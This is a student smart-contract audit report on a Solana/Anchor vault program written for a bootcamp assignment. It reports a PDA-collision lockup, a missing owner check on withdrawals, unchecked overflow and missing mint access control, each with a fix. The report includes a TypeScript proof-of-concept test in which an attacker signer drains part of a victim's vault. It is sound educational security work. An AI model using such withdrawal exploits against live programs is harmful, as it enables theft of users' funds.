# Rektoff Lecture 8 Assignment

**Auditor:** Han (0x4lifemen) (GitHub: [honghan-dev](https://github.com/honghan-dev)) (X: [@4lifemen](https://x.com/4lifemen))

**Scope:** Review of [`account_4/programs/account_4/src/lib.rs`](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/main/lecture_2/account_4/programs/account_4/src/lib.rs#L162-L179)

**Platform:** Solana/Anchor

---

### Table of Contents

1. [Introduction](#intro)
2. [Methodology](#methodology)
3. [Security Review Summary](#summary)
4. [Findings Details](#findings-details)
   * [High Severity](#high)
        * [H-01 - User fund stuck due to DOS caused by PDA collision](#h1)
        * [H-02 – Missing Ownership Validation in `withdraw_from_vault`, anyone can withdraw fund](#h2)
   * [Medium Severity](#medium)
   * [Low Severity](#low)
        * [L-01 - Missing Overflow Check in `deposit_to_vault`](#low01)
   * [Informational / Gas Optimization](#info)
        * [I-01 - User can't close their `user_vault` that is no longer in used](#info01)
        * [I-02 - Missing access control in `mint_nft` instruction](#info02)

---

## <a id="summary">Summary</a>

The `account_4` program implements a simple on-chain vault system on **Solana** using **Anchor framework**. It allows users to create `user_vaults`, deposit funds, and withdraw funds.

The audit reviewed the `initialization`, `deposit`, and `withdrawal` flows — including PDA derivation logic, access control validation, and account lifecycle behavior — to identify potential security and design issues.

---

## Severity Summary

| Severity | Count |
|-----------|-------|
| High   | 2 |
| Medium | 0 |
| Low    | 1 |
| Info   | 2 |
| **Total** | **5** |

---

## <a id="finding-details">Findings Details

### <a id="high">High Severity</a>

### <a id="h1">H-01 - User fund stuck due to DOS caused by PDA collision</a>

**Affected file(s)** [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L27-L38) & [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L110-L119)

**Severity:** HIGH

**Note** This bug has already been identify in the lecture

**Proof of concept:** [Proof of concept](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/main/lecture_2/account_4/tests/account_4.ts)

**Impact:** HIGH

1. User's fund will be stuck in the `user_vault` due to DOS caused by PDA collision, causing direct loss of fund.

**Recommendation**

Remove the `vault_authority` account in the `account_4::WithdrawFromVault`.

```diff
    #[derive(Accounts)]
    #[instruction(user_id: u64, vault_name: String)]
    pub struct WithdrawFromVault<'info> {
        #[account(
            mut,
            seeds = [
                b"user_vault", 
                user_id.to_le_bytes().as_ref(),
                vault_name.as_bytes()
            ],
            bump
        )]
        pub user_vault: Account<'info, UserVault>,
-        #[account(
-            seeds = [
-            b"authority",
-            user_id.to_le_bytes().as_ref(),
-            vault_name.as_bytes()
-            ],
-        bump
-        )]
-        pub vault_authority: Account<'info, UserVault>,
        #[account(mut)]
        pub user: Signer<'info>,
    }
```

### <a id="h2">H-02 – Missing Ownership Validation in `withdraw_from_vault`, anyone can withdraw fund</a>

**Severity:** HIGH

**Affected file(s):** [account_4/src/lib.rs](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L181-L201)

**Description:**
The `account_4::withdraw_from_vault` instruction does not verify that only the vault owner can withdraw NFT.
This allows any signer to withdraw funds from another user’s vault, as long as they supply the correct PDA.

**Finding Description**

[account_4::withdraw_from_vault](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L181-L201) missing an vault owner verification, allowing anyone to withdraw NFT.

```rust
pub fn withdraw_from_vault(
    ctx: Context<WithdrawFromVault>,
    user_id: u64,
    vault_name: String,
    amount: u64,
) -> Result<()> {
    let vault = &mut ctx.accounts.user_vault;

    // @audit missing owner verification
    require!(vault.balance >= amount, ErrorCode::InsufficientBalance);

    vault.balance -= amount;

    msg!(
        "Withdrew {} tokens from vault '{}' for user {}",
        amount,
        vault_name,
        user_id
    );
    Ok(())
}
```

**Impact:** HIGH

1. Attacker can drain any user's fund, causing significant loss to user.

**Proof of Concept**

<details>
<summary>Click here to expand</summary>

Include this test block in the `account_4/tests/account_4.ts`

```typescript
 it("should demonstrate unauthorized withdrawal", async () => {
    console.log("\n=== Testing Unauthorized Withdrawal Vulnerability ===");

    // Generate PDAs
    const [collectionAuthorityPDA] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("authority"),
        collisionId.toArrayLike(Buffer, "le", 8),
        Buffer.from(collisionName)
      ],
      program.programId
    );

    const [userVaultPDA] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_vault"),
        collisionId.toArrayLike(Buffer, "le", 8),
        Buffer.from(collisionName)
      ],
      program.programId
    );

    // Step 1: Create collection authority
    console.log("\nStep 1: Creating collection authority");
    const createCollectionTxSig = await program.methods
      .initializeCollectionAuthority(collisionId, collisionName)
      .accounts({
        collectionAuthority: collectionAuthorityPDA,
        payer: collectionOwner.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([collectionOwner])
      .rpc();

    await showProgramLogs(createCollectionTxSig, "Collection Authority Creation");
    console.log("Collection authority created successfully");

    // Step 2: Initialize user vault
    await program.methods
      .initializeUserVault(collisionId, collisionName)
      .accounts({
        userVault: userVaultPDA,
        payer: vaultUser.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([vaultUser])
      .rpc();

    console.log("✅ Vault created by:", vaultUser.publicKey.toBase58());

    // Step 3: Deposit tokens into the vault (by the owner)
    const depositAmount = new anchor.BN(100);
    await program.methods
      .depositToVault(collisionId, collisionName, depositAmount)
      .accounts({
        userVault: userVaultPDA,
        user: vaultUser.publicKey,
      })
      .signers([vaultUser])
      .rpc();

    // vault balance before the attack
    let vaultAfter = await program.account.userVault.fetch(userVaultPDA);
    console.log("Vault balance before:", vaultAfter.balance.toString());

    // Step 4: Attacker tries to withdraw from victim's vault
    try {
      const withdrawAmount = new anchor.BN(50);

      // attacker tries to withdraw
      const withdrawTxSig = await program.methods
        .withdrawFromVault(collisionId, collisionName, withdrawAmount)
        .accounts({
          userVault: userVaultPDA,
          user: attacker.publicKey, // <== Attacker signs here
        })
        .signers([attacker])
        .rpc();

      // vault balance after the attack
      let vaultAfter = await program.account.userVault.fetch(userVaultPDA);
      console.log("Vault balance after:", vaultAfter.balance.toString());
    } catch (error) {
      console.log("✅ Withdrawal failed as expected:", error.message);
    }
  });

```

Call log shows that the balance reduced indicating attacker can drain user's vault:

```sh
Collection authority created successfully
✅ Vault created by: CYYf4hEuhAPPoat485o42A1jRSmXhR9cjgNXvDcHufmS
Vault balance before: 100
Vault balance after: 50
    ✔ should demonstrate unauthorized withdrawal (1850ms)
```

</details>

**Recommendation:**
Add a check ensuring the signer matches the vault owner:

```rust
#[account]
pub struct UserVault {
+   pub user: Pubkey, // <@- add this user
    pub user_id: u64,
    pub vault_name: String,
    pub balance: u64,
}

#[derive(Accounts)]
#[instruction(user_id: u64, vault_name: String)]
pub struct InitializeUserVault<'info> {
    #[account(
        init,
        payer = payer,
+       space = 8 + 8 + 4 + vault_name.len() + 8 + 32, // <@- add additional 32 bytes
        seeds = [
            b"user_vault", 
            user_id.to_le_bytes().as_ref(),
            vault_name.as_bytes()
        ],
        bump
    )]
    pub user_vault: Account<'info, UserVault>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(user_id: u64, vault_name: String)]
pub struct WithdrawFromVault<'info> {
    #[account(
        mut,
        seeds = [
            b"user_vault", 
            user_id.to_le_bytes().as_ref(),
            vault_name.as_bytes()
        ],
        bump,
        has_one = user // <@- add this constraint
    )]
    pub user_vault: Account<'info, UserVault>,
    #[account(mut)]
    pub user: Signer<'info>,
}
```

---

### <a id="low">Low Severity</a>

### <a id="low01">L-01 Missing Overflow Check in `deposit_to_vault`</a>

**Severity:** Low

**Description**

The [`account_4::deposit_to_vault`](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L162-L179) instruction updates the vault balance using unchecked arithmetic:

While this condition is practically unreachable for `SOL (9 decimals)` or typical tokens, it becomes plausible if the vault is later extended to support high-precision tokens (e.g., 12–18 decimals), as sometimes seen with bridged or synthetic SPL tokens.

```rust
pub fn deposit_to_vault(
    ctx: Context<DepositToVault>,
    user_id: u64,
    vault_name: String,
    amount: u64,
) -> Result<()> {
    let vault = &mut ctx.accounts.user_vault;

    vault.balance += amount; // <@-- @audit doesn't check for overflow

    msg!(
        "Deposited {} tokens to vault '{}' for user {}",
        amount,
        vault_name,
        user_id
    );
    Ok(())
}
```

**Impact:**

1. Vault balances may wrap around to zero or incorrect values.

**Recommendation**

```diff
pub fn deposit_to_vault(
    ctx: Context<DepositToVault>,
    user_id: u64,
    vault_name: String,
    amount: u64,
) -> Result<()> {
    // CODE OMITTED
-   vault.balance += amount;
+   vault.balance = vault
+     .balance
+     .checked_add(amount)
+     .ok_or(ErrorCode::Overflow)?;

    // CODE OMITTED
}
```

---

### <a id="info">Informational</a>

### <a id="info01">I-01 - User can't close `user_vault` that is no longer used in</a>

**Severity:** Informational

**Description**

When a user withdraws their full balance from the vault, the UserVault PDA remains open on-chain.
Since PDAs are rent-exempt accounts, a small amount of SOL (the rent-exemption lamports) remains locked inside the account indefinitely.

```rust
#[account(
    init,
    payer = payer,
    space = 8 + 8 + 4 + vault_name.len() + 8,
    seeds = [b"user_vault", user_id.to_le_bytes().as_ref(), vault_name.as_bytes()],
    bump
)]
pub user_vault: Account<'info, UserVault>,
```

**Impact:** Low

1. The user loses a small amount of SOL used for rent (typically ~0.002–0.005 SOL).
2. Over time, a large number of empty vaults can increase state bloat and unnecessary ledger footprint.

**Recommendation**

Allow user to close their `user_vault`

### <a id="info02">I-02 - Missing access control in `mint_nft` instruction</a>

**Severity:** Informational

**Description**

[MintNFT](https://github.com/mario-eth/rektoff-solana-bootcamp-lectures/blob/c51909976951612ed95d429b6083072e396e3c1e/lecture_2/account_4/programs/account_4/src/lib.rs#L67-L79) doesn't have access control, allowing anyone to mint NFT.

However as the function currently doesn't modify any state, hence reporting as informational

```rust
pub struct MintNft<'info> {
    #[account(
        seeds = [
            b"authority", 
            collection_id.to_le_bytes().as_ref(),
            collection_name.as_bytes()
        ],
        bump
    )]
    pub collection_authority: Account<'info, CollectionAuthority>,
    #[account(mut)]
    pub minter: Signer<'info>,
}
```

**Impact:** Informational

**Recommendation**

Add authority field in the `CollectionAuthority` struct and use it as such:

```diff
#[account]
pub struct CollectionAuthority {
    pub collection_id: u64,
    pub collection_name: String,
    pub can_mint: u64,
+   pub authority: Pubkey, // <@- add this
}

pub fn mint_nft(
    ctx: Context<MintNft>,
    collection_id: u64,
    collection_name: String,
) -> Result<()> {
    // CODE OMITTED

+   require_keys_eq!(
+     collection.authority,
+     ctx.accounts.minter.key(),
+     ErrorCode::Unauthorized
+   );

    // CODE OMITTED
}
```
